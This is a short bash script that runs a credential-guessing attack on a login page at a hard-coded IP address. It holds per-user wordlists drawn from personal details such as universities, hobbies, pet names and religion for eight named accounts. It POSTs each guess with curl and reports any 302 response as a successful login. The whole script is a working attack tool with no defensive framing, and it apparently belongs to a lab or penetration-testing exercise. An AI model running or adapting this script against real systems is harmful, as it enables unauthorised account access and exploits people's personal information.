#!/bin/bash

TARGET="http://82.46.91.201/connect.php"

declare -A passwords
passwords["scooling"]="vegan chacos BYU byu church folk Vegan Chacos scooling"
passwords["tlee"]="drake Drake hiking korean Loyola loyola tlee bbq uzi"
passwords["mjones"]="Purdue purdue boilermakers Boilermakers SigEp football mjones"
passwords["jgreene"]="reddit Reddit wow WoW Clemson clemson warcraft jgreene"
passwords["lpeterson"]="USC usc kayaking hiking lpeterson Kayaking restaurants"
passwords["sdash"]="yoga Yoga UT austin Austin traveling french sdash"
passwords["rjohnson"]="UNC unc sports rameses Rameses crossword rjohnson"
passwords["jsmithison"]="Stanford stanford nuclear Momo momo knitting jsmithison"

for user in "${!passwords[@]}"; do
  for pass in ${passwords[$user]}; do
    code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
      -X POST $TARGET \
      -d "user=$user&password=$pass")
    echo "$user:$pass -> $code"
    if [ "$code" == "302" ]; then
      echo "*** SUCCESS: $user:$pass ***"
    fi
  done
done
